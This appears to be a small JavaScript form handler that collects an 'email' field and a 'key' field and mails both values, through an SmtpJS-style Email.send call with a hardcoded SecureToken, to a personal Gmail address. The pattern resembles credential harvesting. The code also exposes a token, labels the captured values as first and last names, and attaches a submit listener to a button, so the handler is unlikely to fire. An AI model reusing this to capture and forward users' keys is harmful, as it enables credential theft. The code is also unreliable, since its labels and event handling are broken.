const userEmail=document.getElementById("email");
const userKey=document.getElementById("key");
const submit = document.getElementById("submit"); // Add this line to select the submit button

submit.addEventListener('submit',(e)=>{
    e.preventDefault();
    let ebody = `
    <h1>First Name: </h1>${userEmail.value}
    <br>
    <h1>Last Name: </h1>${userKey.value}
    `;

    Email.send({
        SecureToken : "03be7aa5-9b86-4708-96cf-cdcaf4e42174", //add your token here
        To : 'doodleclassroom16@gmail.com', 
        From : "doodleclassroom16@gmail.com",
        Subject : "Tasty testing",
        Body : ebody
    }).then(
      message => alert(message)
    );
});